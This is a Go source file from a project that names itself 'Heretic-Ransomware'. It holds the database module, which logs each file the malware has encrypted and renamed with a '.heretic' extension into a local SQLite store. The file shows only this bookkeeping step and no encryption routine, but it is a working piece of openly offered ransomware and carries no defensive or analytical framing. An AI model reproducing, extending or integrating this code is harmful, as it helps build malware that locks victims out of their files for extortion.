package database

import (
	"fmt"
	"github.com/dark-faction/Heretic-Ransomware/internal/startup"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"
)

type EncryptedPaths struct {
	Path     string `json:"path,omitempty"`
	FileName string `json:"file_name,omitempty"`
}

func WritePath(encryptedPaths []EncryptedPaths) {
	db, err := gorm.Open(sqlite.Open("heretic.db"), &gorm.Config{})
	if err != nil {
		panic("failed to connect database")
	}

	for _, path := range encryptedPaths {
		db.Create(&startup.EncryptedFileInfo{
			Path:      path.Path,
			FileName:  path.FileName,
			RenamedTo: fmt.Sprintf("%s.heretic", path.FileName),
		})
	}
}
